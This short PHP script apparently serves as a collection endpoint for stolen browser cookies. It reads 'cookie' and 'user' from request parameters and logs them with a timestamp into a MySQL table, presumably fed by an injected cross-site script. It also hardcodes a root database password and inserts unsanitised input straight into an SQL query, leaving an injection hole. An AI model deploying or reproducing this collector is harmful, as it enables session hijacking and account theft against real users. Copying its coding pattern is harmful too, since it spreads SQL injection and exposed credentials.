<?php
$cookie=$_REQUEST['cookie'];
$user=$_REQUEST['user'];

$con=mysql_connect("localhost","root","`ASdf31415926.") or die("Unable to connect to the MySQL!");
$db = mysql_select_db("test",$con);

$r=mysql_query("INSERT INTO tb_user(user,cookie,time)VALUES('$user','$cookie',Now())");

mysql_close($con);



